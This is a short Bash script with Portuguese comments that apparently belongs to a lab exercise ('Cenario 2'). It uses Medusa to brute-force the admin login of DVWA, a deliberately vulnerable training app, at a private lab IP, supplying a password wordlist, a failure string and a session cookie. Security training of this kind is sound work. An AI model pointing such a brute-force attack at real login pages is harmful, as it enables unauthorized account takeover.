#!/usr/bin/env bash
# Cenario 2 - forca bruta no formulario de login do DVWA (nivel Low).
# Uso: ./ataque_dvwa.sh [ip_do_alvo] [PHPSESSID]
# Lembra de pegar o PHPSESSID no DevTools do navegador antes.

set -euo pipefail

ALVO="${1:-192.168.56.102}"
PHPSESSID="${2:-COLE_O_PHPSESSID_AQUI}"

echo "[*] Atacando o login do DVWA em ${ALVO}..."

medusa -h "${ALVO}" \
       -u admin \
       -P wordlists/passwords.txt \
       -M http \
       -m DIR:/dvwa/vulnerabilities/brute/ \
       -m METHOD:GET \
       -m FORM-DATA:"username=&password=&Login=Login" \
       -m DENY-SIGNAL:"Username and/or password incorrect." \
       -m COOKIE:"security=low; PHPSESSID=${PHPSESSID}" \
       -t 3 \
       -O images/dvwa_resultado.txt

echo "[+] Pronto. Olha o resultado em images/dvwa_resultado.txt"
